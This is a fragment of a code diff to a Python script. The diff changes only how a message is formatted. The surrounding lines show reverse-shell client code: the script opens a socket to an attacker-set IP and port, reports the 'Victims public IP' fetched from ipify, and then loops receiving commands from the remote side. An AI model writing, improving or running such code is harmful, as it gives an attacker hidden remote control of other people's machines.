@@ -15,7 +15,7 @@ try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((IP, PORT))
     ip = get('https://api.ipify.org').text
-    s.send('[+] Victims public IP: {}'.format(ip).encode())
+    s.send(f'[+] Victims public IP: {ip}'.encode())
     while True:
         command = s.recv(1024).decode()
         if command != "":
